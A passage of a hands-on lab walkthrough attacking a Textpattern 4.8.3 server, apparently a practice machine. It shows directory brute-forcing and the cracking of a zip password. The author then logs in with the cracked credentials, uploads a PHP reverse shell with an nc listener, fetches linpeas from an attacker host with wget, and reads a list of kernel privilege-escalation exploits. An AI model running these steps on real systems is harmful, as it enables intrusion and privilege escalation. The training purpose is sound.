404      GET        9l       33w      309c http://192.168.189.219/textpattern/rpc/New%20Folder.zip
404      GET        9l       33w      306c http://192.168.189.219/textpattern/rpc/Site%20Assets
404      GET        9l       33w      310c http://192.168.189.219/textpattern/rpc/Site%20Assets.zip
404      GET        9l       34w      310c http://192.168.189.219/textpattern/rpc/What%20is%20New.zip
[####################] - 80s   180205/180205  0s      found:358     errors:278    
[####################] - 73s    30000/30000   412/s   http://192.168.189.219/ 
[####################] - 73s    30000/30000   410/s   http://192.168.189.219/textpattern/ 
[####################] - 1s     30000/30000   50676/s http://192.168.189.219/textpattern/images/ => Directory listing (add --scan-dir-listings to scan)
[####################] - 1s     30000/30000   49423/s http://192.168.189.219/textpattern/themes/ => Directory listing (add --scan-dir-listings to scan)
[####################] - 0s     30000/30000   1200000/s http://192.168.189.219/textpattern/files/ => Directory listing (add --scan-dir-listings to scan)
[####################] - 72s    30000/30000   416/s   http://192.168.189.219/textpattern/textpattern/ 
[####################] - 2s     30000/30000   15377/s http://192.168.189.219/textpattern/textpattern/lib/ => Directory listing (add --scan-dir-listings to scan)
[####################] - 0s     30000/30000   882353/s http://192.168.189.219/textpattern/textpattern/tmp/ => Directory listing (add --scan-dir-listings to scan)
[####################] - 0s     30000/30000   810811/s http://192.168.189.219/textpattern/textpattern/plugins/ => Directory listing (add --scan-dir-listings to scan)
[####################] - 3s     30000/30000   9039/s  http://192.168.189.219/textpattern/textpattern/lang/ => Directory listing (add --scan-dir-listings to scan)
[####################] - 3s     30000/30000   10256/s http://192.168.189.219/textpattern/textpattern/include/ => Directory listing (add --scan-dir-listings to scan)
[####################] - 3s     30000/30000   9852/s  http://192.168.189.219/textpattern/textpattern/admin-themes/ => Directory listing (add --scan-dir-listings to scan)
[####################] - 0s     30000/30000   416667/s http://192.168.189.219/textpattern/textpattern/vendors/ => Directory listing (add --scan-dir-listings to scan)
[####################] - 71s    30000/30000   422/s   http://192.168.189.219/textpattern/textpattern/update/ 
[####################] - 72s    30000/30000   417/s   http://192.168.189.219/textpattern/rpc/ 
[####################] - 71s    30000/30000   425/s   http://192.168.189.219/textpattern/textpattern/setup/  
```

Still not able to find anything interesting, decided to go ahead and use another tool

And truth be told, I managed to find the .zip compressed file using gobuster instead

```
┌──(kali㉿kali)-[~/Desktop]
└─$ gobuster dir -u http://192.168.189.219 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x zip
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.189.219
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              zip
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/index                (Status: 200) [Size: 750]
/db                   (Status: 200) [Size: 53656]
/robots               (Status: 200) [Size: 110]
/spammer              (Status: 200) [Size: 179]
/spammer.zip          (Status: 200) [Size: 179]
Progress: 83121 / 441122 (18.84%)^C
[!] Keyboard interrupt detected, terminating.
Progress: 83434 / 441122 (18.91%)
===============================================================
Finished
===============================================================

```

![](attachments/Pasted%20image%2020250214212903.png)

For cracking a compressed file protected with a password, I chose to go with John the Ripper tool to crack the password using the rockyou dictionary

```
┌──(kali㉿kali)-[~/Downloads]
└─$ zip2john spammer.zip > spammer    
ver 2.0 spammer.zip/creds.txt PKZIP Encr: cmplen=27, decmplen=15, crc=B003611D ts=ADCB cs=b003 type=0
                                                                                                                              
┌──(kali㉿kali)-[~/Downloads]
└─$ cat spammer    
spammer.zip/creds.txt:$pkzip$1*1*2*0*1b*f*b003611d*0*27*0*1b*b003*2d41804a5ea9a60b1769d045bfb94c71382b2e5febf63bda08a56c*$/pkzip$:creds.txt:spammer.zip::spammer.zip
                                                                                                                              
┌──(kali㉿kali)-[~/Downloads]
└─$ john spammer -w=../Desktop/rockyou.txt
Using default input encoding: UTF-8
Loaded 1 password hash (PKZIP [32/64])
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
myspace4         (spammer.zip/creds.txt)     
1g 0:00:00:00 DONE (2025-02-15 03:13) 100.0g/s 2457Kp/s 2457Kc/s 2457KC/s christal..280789
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 

```

I was able to obtain some kind of credentials 

![](attachments/Pasted%20image%2020250214213210.png)

Proceeding forward, I have decided to try loging to the textpattern CMS again

I was then able to login successfully using the obtain credentials previously 

![](attachments/Pasted%20image%2020250214220611.png)

I then discovered that the actual version of the textpattern CMS is 4.8.3

![](attachments/Pasted%20image%2020250214213858.png)

After searching for another exploit I managed to find one on GitHub written in Python

![](attachments/Pasted%20image%2020250214213939.png)

```
┌──(kali㉿kali)-[~/Downloads]
└─$ python exploit.py -t 192.168.189.219 -u mayer -p lionheart -c whoami          
Traceback (most recent call last):
  File "/home/kali/Downloads/exploit.py", line 104, in <module>
    main()
  File "/home/kali/Downloads/exploit.py", line 88, in main
    s,_txp_token = login(login_url, user, password)
                   ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
  File "/home/kali/Downloads/exploit.py", line 42, in login
    s.get(login_url, verify=False)
  File "/usr/lib/python3/dist-packages/requests/sessions.py", line 602, in get
    return self.request("GET", url, **kwargs)
           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
  File "/usr/lib/python3/dist-packages/requests/sessions.py", line 575, in request
    prep = self.prepare_request(req)
           ^^^^^^^^^^^^^^^^^^^^^^^^^
  File "/usr/lib/python3/dist-packages/requests/sessions.py", line 484, in prepare_request
    p.prepare(
  File "/usr/lib/python3/dist-packages/requests/models.py", line 367, in prepare
    self.prepare_url(url, params)
  File "/usr/lib/python3/dist-packages/requests/models.py", line 438, in prepare_url
    raise MissingSchema(
requests.exceptions.MissingSchema: Invalid URL '192.168.189.219/textpattern/index.php': No scheme supplied. Perhaps you meant https://192.168.189.219/textpattern/index.php?

```

Troubleshooting the error, I went on to modify the exploit script to include the correct directory to login onto the website

![](attachments/Pasted%20image%2020250214214614.png)

After modifying the script

![](attachments/Pasted%20image%2020250214214642.png)

After another test the error was still being displayed

```
┌──(kali㉿kali)-[~/Downloads]
└─$ python exploit.py -t 192.168.189.219 -u mayer -p lionheart -c whoami
Traceback (most recent call last):
  File "/home/kali/Downloads/exploit.py", line 104, in <module>
    main()
  File "/home/kali/Downloads/exploit.py", line 88, in main
    s,_txp_token = login(login_url, user, password)
                   ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
  File "/home/kali/Downloads/exploit.py", line 42, in login
    s.get(login_url, verify=False)
  File "/usr/lib/python3/dist-packages/requests/sessions.py", line 602, in get
    return self.request("GET", url, **kwargs)
           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
  File "/usr/lib/python3/dist-packages/requests/sessions.py", line 575, in request
    prep = self.prepare_request(req)
           ^^^^^^^^^^^^^^^^^^^^^^^^^
  File "/usr/lib/python3/dist-packages/requests/sessions.py", line 484, in prepare_request
    p.prepare(
  File "/usr/lib/python3/dist-packages/requests/models.py", line 367, in prepare
    self.prepare_url(url, params)
  File "/usr/lib/python3/dist-packages/requests/models.py", line 438, in prepare_url
    raise MissingSchema(
requests.exceptions.MissingSchema: Invalid URL '192.168.189.219/textpattern/textpattern/index.php': No scheme supplied. Perhaps you meant https://192.168.189.219/textpattern/textpattern/index.php?

```

Attempted to use a different exploit found using searchsploit

```
┌──(kali㉿kali)-[~/Downloads]
└─$ searchsploit -m php/webapps/48943.py
  Exploit: TextPattern CMS 4.8.3 - Remote Code Execution (Authenticated)
      URL: https://www.exploit-db.com/exploits/48943
     Path: /usr/share/exploitdb/exploits/php/webapps/48943.py
    Codes: N/A
 Verified: True
File Type: Python script, Unicode text, UTF-8 text executable
Copied to: /home/kali/Downloads/48943.py


                                                                                                                              
┌──(kali㉿kali)-[~/Downloads]
└─$ nano 48943.py 
                                                                                                                              
┌──(kali㉿kali)-[~/Downloads]
└─$ python 48943.py                                        

Software: TextPattern <= 4.8.3
CVE: CVE-2020-XXXXX - Authenticated RCE via Unrestricted File Upload
Author: Michele '0blio_' Cisternino

[*] USAGE: python3 exploit.py http://target.com username password
[*] EXAMPLE: python3 exploit.py http://localhost admin admin

                                                                                                                              
┌──(kali㉿kali)-[~/Downloads]
└─$ python 48943.py http://192.168.189.219 mayer lionheart

Software: TextPattern <= 4.8.3
CVE: CVE-2020-XXXXX - Authenticated RCE via Unrestricted File Upload
Author: Michele '0blio_' Cisternino

[*] Authenticating to the target as 'mayer'
Traceback (most recent call last):
  File "/home/kali/Downloads/48943.py", line 83, in <module>
    log.success ("Logged in as '{}' (Cookie: txp_login={}; txp_login_public={})".format(username, s.cookies['txp_login'], s.cookies['txp_login_public']))
                                                                                                  ~~~~~~~~~^^^^^^^^^^^^^
  File "/usr/lib/python3/dist-packages/requests/cookies.py", line 334, in __getitem__
    return self._find_no_duplicates(name)
           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
  File "/usr/lib/python3/dist-packages/requests/cookies.py", line 413, in _find_no_duplicates
    raise KeyError(f"name={name!r}, domain={domain!r}, path={path!r}")
KeyError: "name='txp_login', domain=None, path=None"
                                                                                                                              
┌──(kali㉿kali)-[~/Downloads]
└─$ python 48943.py http://192.168.189.219/textpattern/ mayer lionheart

Software: TextPattern <= 4.8.3
CVE: CVE-2020-XXXXX - Authenticated RCE via Unrestricted File Upload
Author: Michele '0blio_' Cisternino

[*] Authenticating to the target as 'mayer'
[✓] Logged in as 'mayer' (Cookie: txp_login=mayer%2C334094ff71a044371a19f859c5e89db8; txp_login_public=9698a681acmayer)
[*] Grabbing _txp_token (required to proceed with exploitation)..
Traceback (most recent call last):
  File "/home/kali/Downloads/48943.py", line 89, in <module>
    scriptJS = soup.find_all("script")[2].string.replace("var textpattern = ", "")[:-2]
               ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
AttributeError: 'NoneType' object has no attribute 'replace'
                                                                                                                              
┌──(kali㉿kali)-[~/Downloads]
└─$ python 48943.py http://192.168.189.219/textpattern/ mayer lionheart

Software: TextPattern <= 4.8.3
CVE: CVE-2020-XXXXX - Authenticated RCE via Unrestricted File Upload
Author: Michele '0blio_' Cisternino

[*] Authenticating to the target as 'mayer'
[✓] Logged in as 'mayer' (Cookie: txp_login=mayer%2Cfd74f9015c61c2b3d9e8c0b9114b1980; txp_login_public=b555a23cbcmayer)
[*] Grabbing _txp_token (required to proceed with exploitation)..
Traceback (most recent call last):
  File "/home/kali/Downloads/48943.py", line 89, in <module>
    scriptJS = soup.find_all("script")[2].string.replace("vartextpattern = ", "")[:-2]
               ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
AttributeError: 'NoneType' object has no attribute 'replace'

```

After deciding that it is too much of a hassle to fix those broken scripts, I've went ahead and attempted to upload the file manually from the CMS page directly 

![](attachments/Pasted%20image%2020250214220648.png)

![](attachments/Pasted%20image%2020250214222211.png)

```
┌──(kali㉿kali)-[~/Downloads]
└─$ cp /usr/share/webshells/php/php-reverse-shell.php ./
                                                                                                                              
┌──(kali㉿kali)-[~/Downloads]
└─$ nano php-reverse-shell.php 

```

```
┌──(kali㉿kali)-[~/Downloads]
└─$ nc -nvlp 4444                                               
listening on [any] 4444 ...


```

![](attachments/Pasted%20image%2020250214220428.png)

Now after the reverse shell payload has been uploaded, I went on to find where it is actually located on the web server

After re-reviewing the output results from both Feroxbuster and Gobuster

![](attachments/Pasted%20image%2020250214221123.png)

And I gained a shell on the target system eventually 

![](attachments/Pasted%20image%2020250214222259.png)

```
$ cat /etc/passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/bin/sh
bin:x:2:2:bin:/bin:/bin/sh
sys:x:3:3:sys:/dev:/bin/sh
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/bin/sh
man:x:6:12:man:/var/cache/man:/bin/sh
lp:x:7:7:lp:/var/spool/lpd:/bin/sh
mail:x:8:8:mail:/var/mail:/bin/sh
news:x:9:9:news:/var/spool/news:/bin/sh
uucp:x:10:10:uucp:/var/spool/uucp:/bin/sh
proxy:x:13:13:proxy:/bin:/bin/sh
www-data:x:33:33:www-data:/var/www:/bin/sh
backup:x:34:34:backup:/var/backups:/bin/sh
list:x:38:38:Mailing List Manager:/var/list:/bin/sh
irc:x:39:39:ircd:/var/run/ircd:/bin/sh
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/bin/sh
nobody:x:65534:65534:nobody:/nonexistent:/bin/sh
libuuid:x:100:101::/var/lib/libuuid:/bin/sh
Debian-exim:x:101:103::/var/spool/exim4:/bin/false
mysql:x:102:105:MySQL Server,,,:/nonexistent:/bin/false
$ ss -ntlup
Netid  State      Recv-Q Send-Q     Local Address:Port       Peer Address:Port 
tcp    LISTEN     0      50             127.0.0.1:3306                  *:*     
tcp    LISTEN     0      128                   :::80                   :::*     
tcp    LISTEN     0      20                   ::1:25                   :::*     
tcp    LISTEN     0      20             127.0.0.1:25                    *:*     
$ 

```

I noticed that there is a MySQL database running internally on port 3306 and a MySQL user as well on the /etc/passwd 

```
$ mysql -u root -h localhost
ERROR 1045 (28000): Access denied for user 'root'@'localhost' (using password: NO)
$ mysql -u www-data -h localhost
ERROR 1045 (28000): Access denied for user 'www-data'@'localhost' (using password: NO)
$ 

```

However, I was not able to login to the MySQL database using neither users as I did not have any credentials for this service

Moving forward I decided to launch linpeas for finding privilege escalation vectors 

```
$ wget http://IP:8000/linpeas.sh 
--2025-02-14 16:19:10--  http://IP:8000/linpeas.sh
Connecting to IP:8000... connected.
HTTP request sent, awaiting response... 200 OK
Length: 839912 (820K) [text/x-sh]
Saving to: `linpeas.sh'

     0K .......... .......... .......... .......... ..........  6% 1.04M 1s
    50K .......... .......... .......... .......... .......... 12% 1.06M 1s
   100K .......... .......... .......... .......... .......... 18% 1.06M 1s
   150K .......... .......... .......... .......... .......... 24% 1.06M 1s
   200K .......... .......... .......... .......... .......... 30% 1.06M 1s
   250K .......... .......... .......... .......... .......... 36% 1.07M 0s
   300K .......... .......... .......... .......... .......... 42% 1.06M 0s
   350K .......... .......... .......... .......... .......... 48% 1.05M 0s
   400K .......... .......... .......... .......... .......... 54% 1.10M 0s
   450K .......... .......... .......... .......... .......... 60% 1.06M 0s
   500K .......... .......... .......... .......... .......... 67% 1.06M 0s
   550K .......... .......... .......... .......... .......... 73% 1.06M 0s
   600K .......... .......... .......... .......... .......... 79% 1.06M 0s
   650K .......... .......... .......... .......... .......... 85% 1.06M 0s
   700K .......... .......... .......... .......... .......... 91% 1.07M 0s
   750K .......... .......... .......... .......... .......... 97% 1.06M 0s
   800K .......... ..........                                 100% 1.10M=0.8s

2025-02-14 16:19:10 (1.06 MB/s) - `linpeas.sh' saved [839912/839912]

$ chmod +x linpeas.sh
$ ./linpeas.sh

```

```

                            ▄▄▄▄▄▄▄▄▄▄▄▄▄▄
                    ▄▄▄▄▄▄▄             ▄▄▄▄▄▄▄▄
             ▄▄▄▄▄▄▄      ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄  ▄▄▄▄
         ▄▄▄▄     ▄ ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄ ▄▄▄▄▄▄
         ▄    ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄
         ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄ ▄▄▄▄▄       ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄
         ▄▄▄▄▄▄▄▄▄▄▄          ▄▄▄▄▄▄               ▄▄▄▄▄▄ ▄
         ▄▄▄▄▄▄              ▄▄▄▄▄▄▄▄                 ▄▄▄▄ 
         ▄▄                  ▄▄▄ ▄▄▄▄▄                  ▄▄▄
         ▄▄                ▄▄▄▄▄▄▄▄▄▄▄▄                  ▄▄
         ▄            ▄▄ ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄   ▄▄
         ▄      ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄
         ▄▄▄▄▄▄▄▄▄▄▄▄▄▄                                ▄▄▄▄
         ▄▄▄▄▄  ▄▄▄▄▄                       ▄▄▄▄▄▄     ▄▄▄▄
         ▄▄▄▄   ▄▄▄▄▄                       ▄▄▄▄▄      ▄ ▄▄
         ▄▄▄▄▄  ▄▄▄▄▄        ▄▄▄▄▄▄▄        ▄▄▄▄▄     ▄▄▄▄▄
         ▄▄▄▄▄▄  ▄▄▄▄▄▄▄      ▄▄▄▄▄▄▄      ▄▄▄▄▄▄▄   ▄▄▄▄▄ 
          ▄▄▄▄▄▄▄▄▄▄▄▄▄▄        ▄          ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄ 
         ▄▄▄▄▄▄▄▄▄▄▄▄▄                       ▄▄▄▄▄▄▄▄▄▄▄▄▄▄
         ▄▄▄▄▄▄▄▄▄▄▄                         ▄▄▄▄▄▄▄▄▄▄▄▄▄▄
         ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄            ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄
          ▀▀▄▄▄   ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄ ▄▄▄▄▄▄▄▀▀▀▀▀▀
               ▀▀▀▄▄▄▄▄      ▄▄▄▄▄▄▄▄▄▄  ▄▄▄▄▄▄▀▀
                     ▀▀▀▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▀▀▀

    /---------------------------------------------------------------------------------\
    |                             Do you like PEASS?                                  |                                       
    |---------------------------------------------------------------------------------|                                       
    |         Learn Cloud Hacking       :     https://training.hacktricks.wiki         |                                      
    |         Follow on Twitter         :     @hacktricks_live                        |                                       
    |         Respect on HTB            :     SirBroccoli                             |                                       
    |---------------------------------------------------------------------------------|                                       
    |                                 Thank you!                                      |                                       
    \---------------------------------------------------------------------------------/                                       
          LinPEAS-ng by carlospolop                                                                                           
                                                                                                                              
ADVISORY: This script should be used for authorized penetration testing and/or educational purposes only. Any misuse of this software will not be the responsibility of the author or of any other collaborator. Use it at your own computers and/or with the computer owner's permission.                                                                                                
                                                                                                                              
Linux Privesc Checklist: https://book.hacktricks.wiki/en/linux-hardening/linux-privilege-escalation-checklist.html
 LEGEND:                                                                                                                      
  RED/YELLOW: 95% a PE vector
  RED: You should take a look to it
  LightCyan: Users with console
  Blue: Users without console & mounted devs
  Green: Common things (users, groups, SUID/SGID, mounts, .sh scripts, cronjobs) 
  LightMagenta: Your username

 Starting LinPEAS. Caching Writable Folders...
                               ╔═══════════════════╗
═══════════════════════════════╣ Basic information ╠═══════════════════════════════                                           
                               ╚═══════════════════╝                                                                          
OS: Linux version 3.2.0-4-amd64 (debian-kernel@lists.debian.org) (gcc version 4.6.3 (Debian 4.6.3-14) ) #1 SMP Debian 3.2.78-1
User & Groups: uid=33(www-data) gid=33(www-data) groups=33(www-data)
Hostname: driftingblues

[+] /bin/ping is available for network discovery (LinPEAS can discover hosts, learn more with -h)
[+] /bin/bash is available for network discovery, port scanning and port forwarding (LinPEAS can discover hosts, scan ports, and forward ports. Learn more with -h)                                                                                         
[+] /bin/nc is available for network discovery & port scanning (LinPEAS can discover hosts and scan ports, learn more with -h)
                                                                                                                              

Caching directories . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . DONE
                                                                                                                              
                              ╔════════════════════╗
══════════════════════════════╣ System Information ╠══════════════════════════════                                            
                              ╚════════════════════╝                                                                          
╔══════════╣ Operative system
╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#kernel-exploits                             
Linux version 3.2.0-4-amd64 (debian-kernel@lists.debian.org) (gcc version 4.6.3 (Debian 4.6.3-14) ) #1 SMP Debian 3.2.78-1    
lsb_release Not Found
                                                                                                                              
╔══════════╣ Sudo version
sudo Not Found                                                                                                                
                                                                                                                              

╔══════════╣ PATH
╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#writable-path-abuses                        
/usr/local/bin:/usr/bin:/bin                                                                                                  

╔══════════╣ Date & uptime
Fri Feb 14 16:19:20 CST 2025                                                                                                  
 16:19:20 up  2:19,  0 users,  load average: 0.08, 0.05, 0.05

╔══════════╣ Unmounted file-system?
╚ Check if you can mount umounted devices                                                                                     
UUID=5a40899b-5a6a-4039-93bd-f75bc21a8d58 /               ext4    errors=remount-ro 0       1                                 
UUID=c9a5ff49-f528-4594-8e61-b8100cb73bd7 none            swap    sw              0       0
/dev/sr0        /media/cdrom0   udf,iso9660 user,noauto     0       0

╔══════════╣ Any sd*/disk* disk in /dev? (limit 20)
disk                                                                                                                          
sda
sda1
sda2
sda5

╔══════════╣ Environment
╚ Any private information inside environment variables?                                                                       
OLDPWD=/                                                                                                                      
APACHE_RUN_DIR=/var/run/apache2
APACHE_PID_FILE=/var/run/apache2.pid
PATH=/usr/local/bin:/usr/bin:/bin:/usr/local/sbin:/usr/sbin:/sbin
APACHE_LOCK_DIR=/var/lock/apache2
LANG=C
APACHE_RUN_USER=www-data
APACHE_RUN_GROUP=www-data
APACHE_LOG_DIR=/var/log/apache2
PWD=/tmp

╔══════════╣ Searching Signature verification failed in dmesg
╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#dmesg-signature-verification-failed         
dmesg Not Found                                                                                                               
                                                                                                                              
╔══════════╣ Executing Linux Exploit Suggester
╚ https://github.com/mzet-/linux-exploit-suggester                                                                            
cat: write error: Broken pipe                                                                                                 
cat: write error: Broken pipe
cat: write error: Broken pipe
cat: write error: Broken pipe
cat: write error: Broken pipe
cat: write error: Broken pipe
[+] [CVE-2016-5195] dirtycow

   Details: https://github.com/dirtycow/dirtycow.github.io/wiki/VulnerabilityDetails
   Exposure: highly probable
   Tags: [ debian=7|8 ],RHEL=5{kernel:2.6.(18|24|33)-*},RHEL=6{kernel:2.6.32-*|3.(0|2|6|8|10).*|2.6.33.9-rt31},RHEL=7{kernel:3.10.0-*|4.2.0-0.21.el7},ubuntu=16.04|14.04|12.04
   Download URL: https://www.exploit-db.com/download/40611
   Comments: For RHEL/CentOS see exact vulnerable versions here: https://access.redhat.com/sites/default/files/rh-cve-2016-5195_5.sh

[+] [CVE-2016-5195] dirtycow 2

   Details: https://github.com/dirtycow/dirtycow.github.io/wiki/VulnerabilityDetails
   Exposure: highly probable
   Tags: [ debian=7|8 ],RHEL=5|6|7,ubuntu=14.04|12.04,ubuntu=10.04{kernel:2.6.32-21-generic},ubuntu=16.04{kernel:4.4.0-21-generic}
   Download URL: https://www.exploit-db.com/download/40839
   ext-url: https://www.exploit-db.com/download/40847
   Comments: For RHEL/CentOS see exact vulnerable versions here: https://access.redhat.com/sites/default/files/rh-cve-2016-5195_5.sh

[+] [CVE-2013-2094] perf_swevent

   Details: http://timetobleed.com/a-closer-look-at-a-recent-privilege-escalation-bug-in-linux-cve-2013-2094/
   Exposure: highly probable
   Tags: RHEL=6,ubuntu=12.04{kernel:3.2.0-(23|29)-generic},fedora=16{kernel:3.1.0-7.fc16.x86_64},fedora=17{kernel:3.3.4-5.fc17.x86_64},[ debian=7{kernel:3.2.0-4-amd64} ]
   Download URL: https://www.exploit-db.com/download/26131
   Comments: No SMEP/SMAP bypass

[+] [CVE-2022-32250] nft_object UAF (NFT_MSG_NEWSET)

   Details: https://research.nccgroup.com/2022/09/01/settlers-of-netlink-exploiting-a-limited-uaf-in-nf_tables-cve-2022-32250/
https://blog.theori.io/research/CVE-2022-32250-linux-kernel-lpe-2022/
   Exposure: less probable
   Tags: ubuntu=(22.04){kernel:5.15.0-27-generic}
   Download URL: https://raw.githubusercontent.com/theori-io/CVE-2022-32250-exploit/main/exp.c
   Comments: kernel.unprivileged_userns_clone=1 required (to obtain CAP_NET_ADMIN)

[+] [CVE-2021-22555] Netfilter heap out-of-bounds write

   Details: https://google.github.io/security-research/pocs/linux/cve-2021-22555/writeup.html
   Exposure: less probable
   Tags: ubuntu=20.04{kernel:5.8.0-*}
   Download URL: https://raw.githubusercontent.com/google/security-research/master/pocs/linux/cve-2021-22555/exploit.c
   ext-url: https://raw.githubusercontent.com/bcoles/kernel-exploits/master/CVE-2021-22555/exploit.c
   Comments: ip_tables kernel module must be loaded

[+] [CVE-2019-15666] XFRM_UAF

   Details: https://duasynt.com/blog/ubuntu-centos-redhat-privesc
   Exposure: less probable
   Download URL: 
   Comments: CONFIG_USER_NS needs to be enabled; CONFIG_XFRM needs to be enabled

[+] [CVE-2018-1000001] RationalLove

   Details: https://www.halfdog.net/Security/2017/LibcRealpathBufferUnderflow/
   Exposure: less probable
   Tags: debian=9{libc6:2.24-11+deb9u1},ubuntu=16.04.3{libc6:2.23-0ubuntu9}
   Download URL: https://www.halfdog.net/Security/2017/LibcRealpathBufferUnderflow/RationalLove.c
   Comments: kernel.unprivileged_userns_clone=1 required

[+] [CVE-2017-7308] af_packet

   Details: https://googleprojectzero.blogspot.com/2017/05/exploiting-linux-kernel-via-packet.html
   Exposure: less probable
   Tags: ubuntu=16.04{kernel:4.8.0-(34|36|39|41|42|44|45)-generic}
   Download URL: https://raw.githubusercontent.com/xairy/kernel-exploits/master/CVE-2017-7308/poc.c
   ext-url: https://raw.githubusercontent.com/bcoles/kernel-exploits/master/CVE-2017-7308/poc.c
   Comments: CAP_NET_RAW cap or CONFIG_USER_NS=y needed. Modified version at 'ext-url' adds support for additional kernels

[+] [CVE-2017-6074] dccp

   Details: http://www.openwall.com/lists/oss-security/2017/02/22/3
   Exposure: less probable
   Tags: ubuntu=(14.04|16.04){kernel:4.4.0-62-generic}
   Download URL: https://www.exploit-db.com/download/41458
   Comments: Requires Kernel be built with CONFIG_IP_DCCP enabled. Includes partial SMEP/SMAP bypass

[+] [CVE-2017-1000366,CVE-2017-1000379] linux_ldso_hwcap_64

   Details: https://www.qualys.com/2017/06/19/stack-clash/stack-clash.txt
   Exposure: less probable
   Tags: debian=7.7|8.5|9.0,ubuntu=14.04.2|16.04.2|17.04,fedora=22|25,centos=7.3.1611
   Download URL: https://www.qualys.com/2017/06/19/stack-clash/linux_ldso_hwcap_64.c
   Comments: Uses "Stack Clash" technique, works against most SUID-root binaries

[+] [CVE-2017-1000253] PIE_stack_corruption

   Details: https://www.qualys.com/2017/09/26/linux-pie-cve-2017-1000253/cve-2017-1000253.txt
   Exposure: less probable
   Tags: RHEL=6,RHEL=7{kernel:3.10.0-514.21.2|3.10.0-514.26.1}
   Download URL: https://www.qualys.com/2017/09/26/linux-pie-cve-2017-1000253/cve-2017-1000253.c

[+] [CVE-2016-6663,CVE-2016-6664|CVE-2016-6662] mysql-exploit-chain

   Details: https://legalhackers.com/advisories/MySQL-Maria-Percona-PrivEscRace-CVE-2016-6663-5616-Exploit.html
   Exposure: less probable
   Tags: ubuntu=16.04.1
   Download URL: http://legalhackers.com/exploits/CVE-2016-6663/mysql-privesc-race.c
   Comments: Also MariaDB ver<10.1.18 and ver<10.0.28 affected

[+] [CVE-2016-2384] usb-midi

   Details: https://xairy.github.io/blog/2016/cve-2016-2384
   Exposure: less probable
   Tags: ubuntu=14.04,fedora=22
   Download URL: https://raw.githubusercontent.com/xairy/kernel-exploits/master/CVE-2016-2384/poc.c
   Comments: Requires ability to plug in a malicious USB device and to execute a malicious binary as a non-privileged user

[+] [CVE-2015-9322] BadIRET

   Details: http://labs.bromium.com/2015/02/02/exploiting-badiret-vulnerability-cve-2014-9322-linux-kernel-privilege-escalation/
   Exposure: less probable
   Tags: RHEL<=7,fedora=20
   Download URL: http://site.pi3.com.pl/exp/p_cve-2014-9322.tar.gz

[+] [CVE-2015-8660] overlayfs (ovl_setattr)

   Details: http://www.halfdog.net/Security/2015/UserNamespaceOverlayfsSetuidWriteExec/
   Exposure: less probable
   Tags: ubuntu=(14.04|15.10){kernel:4.2.0-(18|19|20|21|22)-generic}
   Download URL: https://www.exploit-db.com/download/39166

[+] [CVE-2015-8660] overlayfs (ovl_setattr)

   Details: http://www.halfdog.net/Security/2015/UserNamespaceOverlayfsSetuidWriteExec/
   Exposure: less probable
   Download URL: https://www.exploit-db.com/download/39230

[+] [CVE-2014-5207] fuse_suid

   Details: https://www.exploit-db.com/exploits/34923/
   Exposure: less probable
   Download URL: https://www.exploit-db.com/download/34923

[+] [CVE-2014-4699] ptrace/sysret

   Details: http://www.openwall.com/lists/oss-security/2014/07/08/16
   Exposure: less probable
   Tags: ubuntu=12.04
   Download URL: https://www.exploit-db.com/download/34134

[+] [CVE-2014-4014] inode_capable

   Details: http://www.openwall.com/lists/oss-security/2014/06/10/4
   Exposure: less probable
   Tags: ubuntu=12.04
   Download URL: https://www.exploit-db.com/download/33824

[+] [CVE-2014-0196] rawmodePTY

   Details: http://blog.includesecurity.com/2014/06/exploit-walkthrough-cve-2014-0196-pty-kernel-race-condition.html
   Exposure: less probable
   Download URL: https://www.exploit-db.com/download/33516

[+] [CVE-2013-2094] semtex

   Details: http://timetobleed.com/a-closer-look-at-a-recent-privilege-escalation-bug-in-linux-cve-2013-2094/
   Exposure: less probable
   Tags: RHEL=6
   Download URL: https://www.exploit-db.com/download/25444

[+] [CVE-2013-2094] perf_swevent 2

